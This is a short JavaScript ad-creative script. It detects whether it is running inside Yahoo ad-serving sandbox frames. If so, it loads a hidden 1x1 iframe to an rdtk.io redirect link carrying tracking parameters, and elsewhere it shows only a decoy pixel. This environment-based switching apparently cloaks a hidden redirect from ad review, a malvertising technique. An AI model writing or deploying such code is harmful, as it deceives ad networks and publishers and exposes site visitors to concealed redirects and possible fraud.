function genCreative()
{
  var img1 = document.createElement("img");
  img1.setAttribute("src", "https://storage.googleapis.com/cdn-123913844/pixel.png");
  img1.style.width = "1px";
  img1.style.height = "1px";
  document.body.appendChild(img1);
}

function genCreative2()
{
  var img2 = document.createElement("iframe");
  img2.setAttribute("src", "https://mf70e.rdtk.io/5ef51f2174b1be00016bc5e1?sub1=" + window.sub1 + "&sub2=" + window.sub2 + "&sub3=" + window.sub3 + "&sub4=" + window.sub4 + "&sub5=" + window.sub5 + "&sub6=" + window.sub6 + "&sub7=" + window.sub7 + "&sub8=" + window.sub8 );
  img2.style.width = "1px";
  img2.style.height = "1px";
  document.body.appendChild(img2);
}

if(document.URL.indexOf("https://s.yimg.com/rq/darla/4-10-0/html/r-sf.html") > -1 || 
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-10-1/html/r-sf.html") > -1 || 
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-11-0/html/r-sf.html") > -1 || 
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-11-1/html/r-sf.html") > -1 ||
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-12-0/html/r-sf.html") > -1 || 
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-12-1/html/r-sf.html") > -1 || 
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-13-0/html/r-sf.html") > -1 ||
   document.URL.indexOf("https://s.yimg.com/rq/darla/4-13-1/html/r-sf.html") > -1 ||     
   document.URL.indexOf("https://jac.yahoosandbox.com/1.2.0/sandbox.html") > -1) {
    genCreative2();
} else {
    genCreative();
}
